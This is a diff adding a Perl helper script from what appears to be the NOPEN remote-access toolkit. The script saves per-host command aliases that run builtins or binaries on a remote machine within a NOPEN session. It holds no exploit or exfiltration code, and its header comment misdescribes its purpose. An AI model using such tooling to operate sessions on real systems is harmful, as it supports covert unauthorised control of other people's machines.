@@ -1,0 +1,80 @@
+#!/usr/bin/env perl
+## NOPEN autoport script to add a field to the remote PATH.
+$VER="1.0.0.3" ;
+myinit() ;
+
+# If we set $preserve (-A) true, then calls to nopenaddalias() will save
+# those aliases in $opetc/norc.$nopen_rhostname, which -gs auto
+# makes sure we see and use.
+#
+nopenaddalias($newalias,$newcontent,$preserve);
+
+
+sub myinit {
+  $willautoport=1;
+  require "../etc/autoutils" ;
+  $prog = "-gs addalias" ;
+  $vertext = "$prog version $VER\n" ;
+  die("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog);
+  @statusoutput = ();
+  @origargv = @ARGV;
+  mydie("bad option(s)") if (! getopts( "hvA" ) ) ;
+  $preserve=$opt_A; # Leave this undocumented for testing only and for use by autosurvey
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="
+Usage: $prog [--] ALIAS[=CONTENT]
+Usage: $prog [--] ALIAS [CONTENT]
+
+$prog will add a new alias just for this host (or replace the old one,
+if any). To erase an existing alias, leave the CONTENT blank. E.g., this
+replaces the existing =ps alias in this and any future
+windows on this host (you can run -gs auto in any existing window to set
+this aliase there, as well):
+                       $prog =ps /usr/ucb/ps auxwww
+
+Be sure to continue following this convention:
+   Aliases that begin with \"-\" must entail ONLY NOPEN builtins.
+   Aliases that begin with \"=\" will execute one or more remote binaries
+
+Note you need the \"--\" to terminate options when the alias starts with \"-\".
+
+OPTIONS
+
+  -h       show this usage statement
+
+";
+  usage() if ($opt_h or $opt_v or !$ARGV[0]) ;
+  # make sure ARGV is healthy
+  ($newalias,$type,$newcontent) = ();
+  my %donealready = ();
+  foreach (@ARGV) {
+    if (!$type and /^\s*([-=])/) {
+      $type = $1;
+      s/^$type//;
+    }
+    if (/^([^=]+)=(.*)/) {
+      ($newalias,$newcontent) = ($1,$2);
+    } elsif (!$newalias) {
+      $newalias = $_;
+    } else {
+      $newcontent .= " $_";
+    }
+  }
+  $newalias = "$type$newalias";
+  $newcontent =~ s/^\s*//;
+  mydie("Aliases must begin with either a \"-\" or a \"=\"")
+    if ($newalias and ! $type);
+  mydie("Cannot use $prog to set -mynorc or -mypath, they are reserved")
+    if ($newalias eq "-mynorc" or $newalias eq "-mypath");
+  usage() unless $newalias;
+  $socket = pilotstart(quiet);
+}#myinit
